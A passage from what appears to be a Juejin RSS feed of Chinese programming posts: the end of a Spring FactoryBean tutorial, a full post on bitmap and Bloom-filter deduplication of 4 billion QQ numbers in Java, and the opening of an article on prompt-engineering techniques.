<h4 data-id="heading-7">3. 测试获取</h4>
<p>这是最神奇的地方。注意看我们 <code>getBean</code> 的时候，填入的 ID 是实现类的名字（首字母小写），但拿到的却是 <code>getObject()</code> 返回的对象。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@SpringBootTest</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">FactoryBeanTest</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ApplicationContext applicationContext;

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testGetBean</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. 获取 FactoryBean 生产的对象</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> applicationContext.getBean(<span class="hljs-string">"myConnectionFactoryBean"</span>);
        System.out.println(<span class="hljs-string">"获取到的对象类型: "</span> + bean.getClass());
        
        <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> MyConnection) {
            ((MyConnection) bean).connect();
        }
    }
}
</code></pre>
<p><strong>输出结果：</strong></p>
<pre><code class="hljs language-text" lang="text">&gt;&gt;&gt; FactoryBean 开始复杂的造车过程...
获取到的对象类型: class com.example.demo.MyConnection
连接成功，信息：解密后的配置: jdbc:mysql://localhost:3306/mydb
</code></pre>
<hr/>
<h3 data-id="heading-8">进阶技巧：如何获取 FactoryBean 本身？</h3>
<p>有时候，我们确实需要获取那个“造车的工人”（<code>MyConnectionFactoryBean</code>）本身，而不是他造出来的“车”（<code>MyConnection</code>）。</p>
<p>Spring 提供了一个特殊的前缀 <code>&amp;</code>。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">testGetFactorySelf</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 加上 &amp; 前缀</span>
    <span class="hljs-type">Object</span> <span class="hljs-variable">factoryBean</span> <span class="hljs-operator">=</span> applicationContext.getBean(<span class="hljs-string">"&amp;myConnectionFactoryBean"</span>);
    
    System.out.println(<span class="hljs-string">"获取到的对象类型: "</span> + factoryBean.getClass());
    <span class="hljs-comment">// 输出: class com.example.demo.MyConnectionFactoryBean</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-9">核心面试题：BeanFactory 和 FactoryBean 的区别</h3>
<p>这是初级到中级工程师面试中出现频率极高的问题。</p>






























<table><thead><tr><th align="left">特性</th><th align="left"><strong>BeanFactory</strong></th><th align="left"><strong>FactoryBean</strong></th></tr></thead><tbody><tr><td align="left"><strong>本质</strong></td><td align="left"><strong>容器 (Container)</strong></td><td align="left"><strong>Bean</strong></td></tr><tr><td align="left"><strong>角色</strong></td><td align="left">Spring IoC 容器的顶层接口，它是工厂本身，负责管理所有的 Bean。</td><td align="left">Spring 中的一种特殊接口，它是一个可以生产对象的 Bean。</td></tr><tr><td align="left"><strong>职责</strong></td><td align="left">负责 Bean 的实例化、定位、配置应用程序中的对象及建立这些对象间的依赖。</td><td align="left">负责实例化那种逻辑很复杂的 Bean（例如 MyBatis 的 <code>SqlSessionFactoryBean</code>）。</td></tr><tr><td align="left"><strong>使用方式</strong></td><td align="left"><code>context.getBean("xxx")</code> 调用的是 BeanFactory 的方法。</td><td align="left">用户自定义实现，用来介入 Bean 的创建过程。</td></tr></tbody></table>
<p><strong>一句话总结：</strong></p>
<ul>
<li><strong>BeanFactory</strong> 是 Spring 框架的心脏（大工厂），它装着所有的 Bean。</li>
<li><strong>FactoryBean</strong> 是大工厂里的一个特殊生产线（小工厂），专门用来生产某个复杂的 Bean。</li>
</ul>
<hr/>
<h3 data-id="heading-10">源码中的经典应用</h3>
<p><code>FactoryBean</code> 在开源框架中应用非常广泛，证明了它的实用性：</p>
<ol>
<li><strong>MyBatis</strong>: <code>SqlSessionFactoryBean</code>。MyBatis 整合 Spring 时，就是通过这个 FactoryBean 创建了 <code>SqlSessionFactory</code>，因为它需要读取 <code>mapper.xml</code>、配置数据源等一堆复杂操作。</li>
<li><strong>Feign</strong>: OpenFeign 在生成接口的动态代理对象时，也是利用了 <code>FactoryBean</code> 的机制。</li>
<li><strong>Spring AOP</strong>: <code>ProxyFactoryBean</code>，用于创建代理对象。</li>
</ol>
<h3 data-id="heading-11">总结</h3>
<p>对于初学者来说，掌握 <code>FactoryBean</code> 有助于理解 Spring 是如何整合第三方框架的。当你遇到以下场景时，请想起它：</p>
<ul>
<li>对象的创建逻辑非常复杂，用 xml 或者 <code>@Bean</code> 代码太乱。</li>
<li>你需要引用第三方库的类，但没法直接修改源码加注解。</li>
<li>你需要动态代理生成某个接口的实现类注入到容器中。</li>
</ul>
<p>希望这篇博客能帮你解开 <code>FactoryBean</code> 的面纱！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[40亿QQ号,不超过1G内存,如何去重?]]></title>    <link>https://juejin.cn/post/7581412607062130734</link>    <guid>https://juejin.cn/post/7581412607062130734</guid>    <pubDate>2025-12-09T05:55:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412607062130734" data-draft-id="7581448482545549338" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="40亿QQ号,不超过1G内存,如何去重?"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-09T05:55:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小垣"/> <meta itemprop="url" content="https://juejin.cn/user/4187396372955981"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            40亿QQ号,不超过1G内存,如何去重?
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4187396372955981/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小垣
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T05:55:56.000Z" title="Tue Dec 09 2025 05:55:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 <strong>40 亿 QQ 号（64 位整数级别）</strong> 、<strong>内存不超过 1GB</strong> 的条件下做去重，经典可行方案只有「<strong>位图（Bitmap / BitSet）</strong> 」，甚至进阶到「布隆过滤器」。</p>
<p>我给你讲最可落地的几种方案，按工程可行性来排：</p>
<h2 data-id="heading-0">✅ 最优方案：Bitmap（位图，精确去重）</h2>
<h3 data-id="heading-1">1. 内存计算</h3>
<p>假设 QQ 号范围：<br/>
最大约 <strong>10～11 位数字</strong>，最大值约 <code>4,000,000,0000</code>（按 400 亿上限算）。</p>
<p>但常见按 <strong>40 亿（4×10⁹）</strong> 来设计：
40 亿 bit ≈ 4,000,000,000 bits
= 500,000,000 bytes
≈ 477 MB</p>
<p>结论：<br/>
<strong>Bitmap 完全可以在 1GB 内存内精确去重</strong> ✅</p>
<h3 data-id="heading-2">2. 核心思想</h3>
<p>用 bit 数组来表示某个 QQ 是否出现过：</p>
<ul>
<li>位置 = QQ号</li>
<li>值 = 0 → 未出现</li>
<li>值 = 1 → 已出现</li>
</ul>
<p>读取每个 QQ：</p>
<ul>
<li>如果该位为 0 → 标记为 1</li>
<li>如果已经是 1 → 说明重复</li>
</ul>
<h3 data-id="heading-3">3. Java 示例代码（可直接运行）</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.BufferedReader;
<span class="hljs-keyword">import</span> java.io.FileReader;


<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">QQDedupBitmap</span> {

    <span class="hljs-comment">// 假设最大QQ号 = 4_000_000_000</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">MAX_QQ</span> <span class="hljs-operator">=</span> <span class="hljs-number">4_000_000_000L</span>;
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">BIT_PER_BYTE</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 分配位图</span>
        <span class="hljs-type">byte</span>[] bitmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>)(MAX_QQ / BIT_PER_BYTE + <span class="hljs-number">1</span>)];

        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">br</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">"/Users/longjun/Downloads/qq.txt"</span>));
        String line;

        <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">long</span> <span class="hljs-variable">qq</span> <span class="hljs-operator">=</span> Long.parseLong(line.trim());
            <span class="hljs-type">long</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> qq / <span class="hljs-number">8</span>;
            <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)(qq % <span class="hljs-number">8</span>);

            <span class="hljs-keyword">if</span> ((bitmap[(<span class="hljs-type">int</span>)index] &amp; (<span class="hljs-number">1</span> &lt;&lt; offset)) != <span class="hljs-number">0</span>) {
                <span class="hljs-comment">// 重复</span>
                <span class="hljs-comment">// 你可以输出或统计</span>
                System.out.println(<span class="hljs-string">"重复的QQ号："</span> + qq);
            } <span class="hljs-keyword">else</span> {
                bitmap[(<span class="hljs-type">int</span>)index] |= (<span class="hljs-number">1</span> &lt;&lt; offset);
            }
        }
        br.close();
        <span class="hljs-comment">// 恢复QQ号</span>
        recoverQQFast(bitmap);
    }

    <span class="hljs-comment">/**
     * 快速恢复QQ号
     * <span class="hljs-doctag">@param</span> bitmap
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recoverQQFast</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bitmap)</span> {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; bitmap.length; i++) {
            <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> bitmap[i] &amp; <span class="hljs-number">0xFF</span>;
            <span class="hljs-keyword">while</span> (b != <span class="hljs-number">0</span>) {
                <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> Integer.numberOfTrailingZeros(b);
                <span class="hljs-type">long</span> <span class="hljs-variable">qq</span> <span class="hljs-operator">=</span> (<span class="hljs-type">long</span>) i * <span class="hljs-number">8</span> + offset;
                System.out.println(qq);
                b &amp;= (b - <span class="hljs-number">1</span>);
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-4">如果 QQ 号范围极大（比如 10¹² 级别）</h2>
<p>Bitmap 不现实，使用：</p>
<h3 data-id="heading-5">✅ 布隆过滤器（Bloom Filter）</h3>
<p>特点：</p>





















<table><thead><tr><th>特点</th><th>说明</th></tr></thead><tbody><tr><td>内存占用小</td><td>比 HashSet 小 10 倍以上</td></tr><tr><td>误判率</td><td>存在（会把新数据误认为重复）</td></tr><tr><td>不会漏判</td><td>重复一定判重复</td></tr></tbody></table>
<p>适合场景：</p>
<ul>
<li>爬虫 URL 去重</li>
<li>用户 ID 去重</li>
<li>海量日志去重</li>
</ul>
<h3 data-id="heading-6">Java 布隆过滤器实现（精简版）</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.BitSet;
<span class="hljs-keyword">import</span> java.util.zip.CRC32;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BloomFilter</span> {
    <span class="hljs-keyword">private</span> BitSet bitSet;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> size;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BloomFilter</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span> {
        <span class="hljs-built_in">this</span>.size = size;
        <span class="hljs-built_in">this</span>.bitSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BitSet</span>(size);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(<span class="hljs-type">long</span> value, <span class="hljs-type">int</span> seed)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> value ^ (value &gt;&gt;&gt; <span class="hljs-number">16</span>) * seed;
        <span class="hljs-keyword">return</span> (<span class="hljs-type">int</span>)(Math.abs(h) % size);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isDuplicate</span><span class="hljs-params">(<span class="hljs-type">long</span> value)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> hash(value, <span class="hljs-number">31</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">h2</span> <span class="hljs-operator">=</span> hash(value, <span class="hljs-number">131</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">h3</span> <span class="hljs-operator">=</span> hash(value, <span class="hljs-number">1313</span>);

        <span class="hljs-keyword">if</span> (bitSet.get(h1) &amp;&amp; bitSet.get(h2) &amp;&amp; bitSet.get(h3)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        bitSet.set(h1);
        bitSet.set(h2);
        bitSet.set(h3);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}

</code></pre>
<h2 data-id="heading-7">🚀 超大数据工程级方案</h2>
<p>当数据根本放不下内存：</p>
<ol>
<li>外部排序 + 归并去重</li>
<li>Hash 分桶 -&gt; 小文件去重</li>
<li>Hadoop / Spark</li>
</ol>
<hr/>
<h2 data-id="heading-8">✅ 总结一句</h2>
<p>在「40 亿 QQ 号 + 内存不超过 1GB」这个条件下：</p>

















<table><thead><tr><th>目标</th><th>最优方案</th></tr></thead><tbody><tr><td>精确去重</td><td><strong>Bitmap 位图 ✅</strong></td></tr><tr><td>允许误判</td><td><strong>布隆过滤器 ✅</strong></td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenAI、Anthropic 和 Google 使用 10 种prompt技术来保证近乎完美的准确率]]></title>    <link>https://juejin.cn/post/7581412607062114350</link>    <guid>https://juejin.cn/post/7581412607062114350</guid>    <pubDate>2025-12-09T05:55:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412607062114350" data-draft-id="7581448482544959514" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenAI、Anthropic 和 Google 使用 10 种prompt技术来保证近乎完美的准确率"/> <meta itemprop="keywords" content="OpenAI,ChatGPT"/> <meta itemprop="datePublished" content="2025-12-09T05:55:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="__so__"/> <meta itemprop="url" content="https://juejin.cn/user/2013961030731198"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenAI、Anthropic 和 Google 使用 10 种prompt技术来保证近乎完美的准确率
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2013961030731198/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    __so__
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T05:55:09.000Z" title="Tue Dec 09 2025 05:55:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">技巧一：基于角色的约束提示</h2>
<p>专家不会直接要求 AI “编写代码”，而是会为 AI 分配具有特定约束的专家角色。</p>
<p>模板：</p>
<pre><code class="hljs language-css" lang="css">你是 <span class="hljs-selector-attr">[特定角色]</span>，在 <span class="hljs-selector-attr">[领域]</span> 拥有 <span class="hljs-selector-attr">[X 年]</span> 经验
你的任务：<span class="hljs-selector-attr">[具体任务]</span>
约束：<span class="hljs-selector-attr">[列出 3-5 个具体限制]</span>
输出格式：<span class="hljs-selector-attr">[所需的确切格式]</span>
</code></pre>
<hr/>
<p>例如：</p>
<pre><code class="hljs language-diff" lang="diff">你是一位拥有 10 年数据管道优化经验的高级 Python 工程师。

你的任务：构建一个每小时处理 1000 万条记录的实时 ETL 管道。

约束：
<span class="hljs-deletion">- 必须使用 Apache Kafka</span>
<span class="hljs-deletion">- 最大内存占用 2GB</span>
<span class="hljs-deletion">- 延迟低于 100 毫秒</span>
<span class="hljs-deletion">- 零数据丢失容忍度</span>

输出格式：带有内联文档的生产就绪代码
</code></pre>
<hr/>
<p>这种方法比“给我编写一个 ETL 管道”的指令能获得更具体的输出，精度高出 10 倍。</p>
<h2 data-id="heading-1">技巧二：链式验证 (CoVe)</h2>
<p>谷歌的研究团队使用这种方法来消除模型的“幻觉”。</p>
<p>模型生成一个答案，然后生成验证问题，回答这些问题，并最终完善原始答案。</p>
<p>模板：</p>
<pre><code class="hljs language-css" lang="css">任务：<span class="hljs-selector-attr">[你的问题]</span>
步骤 <span class="hljs-number">1</span>：提供你的初始答案
步骤 <span class="hljs-number">2</span>：生成 <span class="hljs-number">5</span> 个验证问题，以发现你答案中的错误
步骤 <span class="hljs-number">3</span>：回答每个验证问题
